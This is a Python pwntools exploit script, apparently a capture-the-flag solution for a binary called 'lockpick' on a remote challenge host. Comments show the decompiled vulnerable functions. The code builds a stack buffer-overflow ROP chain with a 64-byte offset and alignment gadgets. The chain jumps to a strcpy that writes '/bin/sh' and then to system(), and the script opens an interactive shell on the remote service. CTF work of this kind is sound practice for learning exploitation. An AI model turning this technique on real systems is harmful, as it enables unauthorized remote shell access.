#!/usr/bin/env python3

from pwn import *

e = ELF("./lockpick_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "lockpick.deadface.io"  # Remote host IP
PORT = 26697  # Remote port

gdb_script = """
b main
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target

    # [0x00401090]> pdg @main
    #
    # ulong main(void)
    #
    # {
    #     sym.imp.setbuf(_reloc.stdout,0);
    #     sym.vuln();
    #     sym.imp.puts("Trying to unlock...");
    #     if ((((_obj.pin1 == 1) && (_obj.pin2 == 1)) && (_obj.pin3 == 1)) && ((_obj.pin4 == 1 && (_obj.pin5 == 1)))) {
# ->          sym.imp.system("/ghh/op");
    #     }
    #     else {
    #         sym.imp.puts("darn, not the right order...");
    #     }
    #     return 0;
    # }
    #
    # [0x00401090]> pdg @sym.pick2
    #
    # void sym.pick2(void)
    #
    # {
    #     if (_obj.pin1 == 1) {
    #         sym.imp.puts("Pin 2 clicked!");
    #         _obj.pin2 = 1;
# ->          sym.imp.strcpy("/ghh/op","/bin/sh");
    #         return;
    #     }
    #     sym.imp.puts("The Lock resists... a pin was skipped!");
    #     //WARNING: Subroutine does not return
    #     sym.imp.exit(0);
    # }


    offset = 64  # Offset to control return address
    
    ret = 0x000000000040101a

    payload = flat({offset: [
            ret,                # Stack alignment
            0x00000000004012cb, # JUMP TO -> sym.imp.strcpy("/ghh/op","/bin/sh");
            ret,                # Stack alignment
            0x000000000040144d  # JUMP TO -> system(shell); 
        ]})  # Flatten payload for sending

    p.sendlineafter(b'with no key?', payload)
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

